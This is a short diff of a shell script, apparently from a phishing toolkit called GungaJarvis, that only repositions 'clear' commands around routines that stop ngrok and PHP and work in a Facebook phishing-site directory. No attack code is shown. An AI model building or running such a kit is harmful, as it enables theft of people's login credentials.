@@ -22,13 +22,13 @@ fi
 check_files
 
 stop() {
-clear
 echo -e 'Stopping the server'
 killall ngrok
 echo ''
 echo -e 'Ngrok stopped...'
 killall php
 echo -e 'Php stopped...'
+clear
 }
 
 requirements() {
@@ -127,7 +127,6 @@ done
 transfer_items
 
 cleaner() {
-clear
 cd $HOME/GungaJarvis/utils/phishing/websites/facebook
 while true
 do
